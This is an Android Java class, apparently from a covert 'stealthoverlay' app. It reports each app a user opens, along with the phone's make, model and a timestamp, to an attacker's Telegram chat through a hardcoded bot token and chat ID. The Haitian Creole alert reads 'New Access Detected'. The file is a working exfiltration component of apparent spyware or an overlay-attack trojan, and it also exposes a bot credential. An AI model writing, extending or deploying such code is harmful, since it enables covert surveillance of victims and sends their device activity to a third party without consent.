
package com.example.stealthoverlay;

import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import android.os.Build;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class TelegramSender {

    private static final String BOT_TOKEN = "7874610899:AAE67XFVq9dB1mSPkaVrnqxqp575P39Ag5k";
    private static final String CHAT_ID = "6091575771";

    public static void sendMessage(String appOpened) {
        try {
            String deviceModel = Build.MANUFACTURER + " " + Build.MODEL;
            String timeStamp = new SimpleDateFormat("dd MMM yyyy, HH:mm", Locale.FRANCE).format(new Date());

            String message = "📲 *Nouvo Aksè Detekte!*\n"
                           + "🧾 Telefòn: " + deviceModel + "\n"
                           + "📦 App ouvri: " + appOpened + "\n"
                           + "🕐 Dat: " + timeStamp;

            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String postData = "chat_id=" + CHAT_ID + "&text=" + message + "&parse_mode=Markdown";

            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
            writer.write(postData);
            writer.flush();
            writer.close();

            conn.getInputStream();  // Force the request to be sent
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
